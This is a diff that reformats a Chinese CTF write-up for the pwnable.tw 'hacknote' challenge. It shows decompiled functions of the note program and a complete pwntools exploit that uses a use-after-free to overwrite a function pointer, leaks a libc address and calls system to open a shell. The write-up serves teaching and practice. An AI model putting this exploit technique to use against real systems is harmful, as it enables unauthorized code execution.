@@ -15,183 +15,190 @@ tags:
 
 1，检查保护
 
-	gdb-peda$ checksec
-	CANARY    : ENABLED
-	FORTIFY   : disabled
-	NX        : ENABLED
-	PIE       : disabled
-	RELRO     : Partial
+```python
+gdb-peda$ checksec
+CANARY    : ENABLED
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
+```
 
 2，使用IDA分析程序流程
 
 **main 函数分析**
 
-	void __cdecl __noreturn main()
-	{
-	  int v0;  #eax
-	  char buf;   #[esp+8h] [ebp-10h]
-	  unsigned int v2;   #[esp+Ch] [ebp-Ch]
-	
-	  v2 = __readgsdword(0x14u);
-	  setvbuf(stdout, 0, 2, 0);
-	  setvbuf(stdin, 0, 2, 0);
-	  while ( 1 )
-	  {
-	    while ( 1 )
-	    {
-	      sub_8048956();
-	      read(0, &buf, 4u);
-	      v0 = atoi(&buf);
-	      if ( v0 != 2 )
-	        break;
-	      sub_80487D4();
-	    }
-	    if ( v0 > 2 )
-	    {
-	      if ( v0 == 3 )
-	      {
-	        sub_80488A5();
-	      }
-	      else
-	      {
-	        if ( v0 == 4 )
-	          exit(0);
-	LABEL_13:
-	        puts("Invalid choice");
-	      }
-	    }
-	    else
-	    {
-	      if ( v0 != 1 )
-	        goto LABEL_13;
-	      sub_8048646();
-	    }
-	  }
-	}
+```c
+void __cdecl __noreturn main()
+{
+  int v0;  #eax
+  char buf;   #[esp+8h] [ebp-10h]
+  unsigned int v2;   #[esp+Ch] [ebp-Ch]
 
+  v2 = __readgsdword(0x14u);
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(stdin, 0, 2, 0);
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      sub_8048956();
+      read(0, &buf, 4u);
+      v0 = atoi(&buf);
+      if ( v0 != 2 )
+        break;
+      sub_80487D4();
+    }
+    if ( v0 > 2 )
+    {
+      if ( v0 == 3 )
+      {
+        sub_80488A5();
+      }
+      else
+      {
+        if ( v0 == 4 )
+          exit(0);
+LABEL_13:
+        puts("Invalid choice");
+      }
+    }
+    else
+    {
+      if ( v0 != 1 )
+        goto LABEL_13;
+      sub_8048646();
+    }
+  }
+}
+```
 读入你输入的选项，然后执行对应的函数
 
 **Add 函数分析**
 
-    
-	unsigned int sub_8048646()
-	{
-	  _DWORD *v0;  #ebx
-	  signed int i;    #[esp+Ch] [ebp-1Ch]
-	  int size;   #[esp+10h] [ebp-18h]
-	  char buf;  #[esp+14h] [ebp-14h]
-	  unsigned int v5;  #[esp+1Ch] [ebp-Ch]
-	
-	  v5 = __readgsdword(0x14u);
-	  if ( dword_804A04C <= 5 )
-	  {
-	    for ( i = 0; i <= 4; ++i )
-	    {
-	      if ( !ptr[i] )
-	      {
-	        ptr[i] = malloc(8u);
-	        if ( !ptr[i] )
-	        {
-	          puts("Alloca Error");
-	          exit(-1);
-	        }
-	        *(_DWORD *)ptr[i] = sub_804862B;
-	        printf("Note size :");
-	        read(0, &buf, 8u);
-	        size = atoi(&buf);
-	        v0 = ptr[i];
-	        v0[1] = malloc(size);
-	        if ( !*((_DWORD *)ptr[i] + 1) )
-	        {
-	          puts("Alloca Error");
-	          exit(-1);
-	        }
-	        printf("Content :");
-	        read(0, *((void **)ptr[i] + 1), size);
-	        puts("Success !");
-	        ++dword_804A04C;
-	        return __readgsdword(0x14u) ^ v5;
-	      }
-	    }
-	  }
-	  else
-	  {
-	    puts("Full");
-	  }
-	  return __readgsdword(0x14u) ^ v5;
-	}
+```c
+unsigned int sub_8048646()
+{
+  _DWORD *v0;  #ebx
+  signed int i;    #[esp+Ch] [ebp-1Ch]
+  int size;   #[esp+10h] [ebp-18h]
+  char buf;  #[esp+14h] [ebp-14h]
+  unsigned int v5;  #[esp+1Ch] [ebp-Ch]
 
+  v5 = __readgsdword(0x14u);
+  if ( dword_804A04C <= 5 )
+  {
+    for ( i = 0; i <= 4; ++i )
+    {
+      if ( !ptr[i] )
+      {
+        ptr[i] = malloc(8u);
+        if ( !ptr[i] )
+        {
+          puts("Alloca Error");
+          exit(-1);
+        }
+        *(_DWORD *)ptr[i] = sub_804862B;
+        printf("Note size :");
+        read(0, &buf, 8u);
+        size = atoi(&buf);
+        v0 = ptr[i];
+        v0[1] = malloc(size);
+        if ( !*((_DWORD *)ptr[i] + 1) )
+        {
+          puts("Alloca Error");
+          exit(-1);
+        }
+        printf("Content :");
+        read(0, *((void **)ptr[i] + 1), size);
+        puts("Success !");
+        ++dword_804A04C;
+        return __readgsdword(0x14u) ^ v5;
+      }
+    }
+  }
+  else
+  {
+    puts("Full");
+  }
+  return __readgsdword(0x14u) ^ v5;
+}
+```
 这里分析出来一个结构体
 
-    # -*- coding: utf-8 -*-
-	struct note{
-	
-	            *func       #指向打印函数0x080462b的指针
-	
-	            *msg_ptr   #指向note内容的指针
-	
-	}
+```c
+# -*- coding: utf-8 -*-
+struct note{
 
+            *func       #指向打印函数0x080462b的指针
+
+            *msg_ptr   #指向note内容的指针
+
+}
+```
 
 
 **Delete 函数分析**
 
-	unsigned int sub_80487D4()
-	{
-	  int v1; #[esp+4h] [ebp-14h]
-	  char buf; #[esp+8h] [ebp-10h]
-	  unsigned int v3; #[esp+Ch] [ebp-Ch]
-	
-	  v3 = __readgsdword(0x14u);
-	  printf("Index :");
-	  read(0, &buf, 4u);
-	  v1 = atoi(&buf);
-	  if ( v1 < 0 || v1 >= dword_804A04C )
-	  {
-	    puts("Out of bound!");
-	    _exit(0);
-	  }
-	  if ( ptr[v1] )
-	  {
-	    free(*((void **)ptr[v1] + 1));
-	    free(ptr[v1]);
-	    puts("Success");
-	  }
-	  return __readgsdword(0x14u) ^ v3;
-	}
+```c
+unsigned int sub_80487D4()
+{
+  int v1; #[esp+4h] [ebp-14h]
+  char buf; #[esp+8h] [ebp-10h]
+  unsigned int v3; #[esp+Ch] [ebp-Ch]
 
+  v3 = __readgsdword(0x14u);
+  printf("Index :");
+  read(0, &buf, 4u);
+  v1 = atoi(&buf);
+  if ( v1 < 0 || v1 >= dword_804A04C )
+  {
+    puts("Out of bound!");
+    _exit(0);
+  }
+  if ( ptr[v1] )
+  {
+    free(*((void **)ptr[v1] + 1));
+    free(ptr[v1]);
+    puts("Success");
+  }
+  return __readgsdword(0x14u) ^ v3;
+}
+```
 
 **print 函数分析**
 
-	unsigned int sub_80488A5()
-	{
-	  int v1;  #[esp+4h] [ebp-14h]
-	  char buf;  #[esp+8h] [ebp-10h]
-	  unsigned int v3;  #[esp+Ch] [ebp-Ch]
-	
-	  v3 = __readgsdword(0x14u);
-	  printf("Index :");
-	  read(0, &buf, 4u);
-	  v1 = atoi(&buf);
-	  if ( v1 < 0 || v1 >= dword_804A04C )
-	  {
-	    puts("Out of bound!");
-	    _exit(0);
-	  }
-	  if ( ptr[v1] )
-	    (*(void (__cdecl **)(void *))ptr[v1])(ptr[v1]);
-	  return __readgsdword(0x14u) ^ v3;
-	}
+```c
+unsigned int sub_80488A5()
+{
+  int v1;  #[esp+4h] [ebp-14h]
+  char buf;  #[esp+8h] [ebp-10h]
+  unsigned int v3;  #[esp+Ch] [ebp-Ch]
 
+  v3 = __readgsdword(0x14u);
+  printf("Index :");
+  read(0, &buf, 4u);
+  v1 = atoi(&buf);
+  if ( v1 < 0 || v1 >= dword_804A04C )
+  {
+    puts("Out of bound!");
+    _exit(0);
+  }
+  if ( ptr[v1] )
+    (*(void (__cdecl **)(void *))ptr[v1])(ptr[v1]);
+  return __readgsdword(0x14u) ^ v3;
+}
+```
 该函数最后调用了func指针指向的函数，根据Add函数中的赋值，这个函数应该是sub_804862B
 
 **sub_804862B 函数分析**
 
-	int __cdecl sub_804862B(int a1)
-	{
-	  return puts(*(const char **)(a1 + 4));
-	}
-
+```c
+int __cdecl sub_804862B(int a1)
+{
+  return puts(*(const char **)(a1 + 4));
+}
+```
 该函数的功能就是输出msg_ptr指向内存区域的内容。
 
 ## 0x01 漏洞分析
@@ -242,45 +249,46 @@ leak出free函数的地址后根据提供的目标系统libc文件便可以得�
 
 ## 0x03 完整脚本
 
-	from pwn import *
-	
-	def add(size,data):
-	    p.recvuntil('Your choice :')
-	    p.sendline('1')     
-	    p.recvuntil('Note size :')
-	    p.sendline(str(size))
-	    p.recvuntil('Content :')
-	    p.sendline(data)
-	 
-	def delete(index):
-	    p.recvuntil('Your choice :')
-	    p.sendline('2')
-	    p.recvuntil('Index :')
-	    p.sendline(str(index))
-	 
-	def puts(index):
-	    p.recvuntil('Your choice :')
-	    p.sendline('3')
-	    p.recvuntil('Index :')
-	    p.sendline(str(index))
-	
-	p=process('./hacknote')
-	libc=ELF('/lib/i386-linux-gnu/libc-2.27.so')
-	libc_free_addr=libc.symbols['free']
-	libc_system_addr=libc.symbols['system']
-	add(40,'a'*39)
-	add(40,'b'*39)
-	delete(0)
-	delete(1)
-	add(8,p32(0x804862b)+p32(0x0804A018))
-	puts(0)
-	free_addr=u32(p.recv(4))
-	system_addr=free_addr-(libc_free_addr-libc_system_addr)
-	delete(2)
-	add(8,p32(system_addr)+';$0')
-	puts(0)
-	p.interactive()
+```python
+from pwn import *
 
+def add(size,data):
+    p.recvuntil('Your choice :')
+    p.sendline('1')     
+    p.recvuntil('Note size :')
+    p.sendline(str(size))
+    p.recvuntil('Content :')
+    p.sendline(data)
+ 
+def delete(index):
+    p.recvuntil('Your choice :')
+    p.sendline('2')
+    p.recvuntil('Index :')
+    p.sendline(str(index))
+ 
+def puts(index):
+    p.recvuntil('Your choice :')
+    p.sendline('3')
+    p.recvuntil('Index :')
+    p.sendline(str(index))
+
+p=process('./hacknote')
+libc=ELF('/lib/i386-linux-gnu/libc-2.27.so')
+libc_free_addr=libc.symbols['free']
+libc_system_addr=libc.symbols['system']
+add(40,'a'*39)
+add(40,'b'*39)
+delete(0)
+delete(1)
+add(8,p32(0x804862b)+p32(0x0804A018))
+puts(0)
+free_addr=u32(p.recv(4))
+system_addr=free_addr-(libc_free_addr-libc_system_addr)
+delete(2)
+add(8,p32(system_addr)+';$0')
+puts(0)
+p.interactive()
+```
 
 >[文件下载](https://github.com/yxshyj/project/tree/master/pwn/pwnable.tw%E4%B9%8Bhacknote)
 
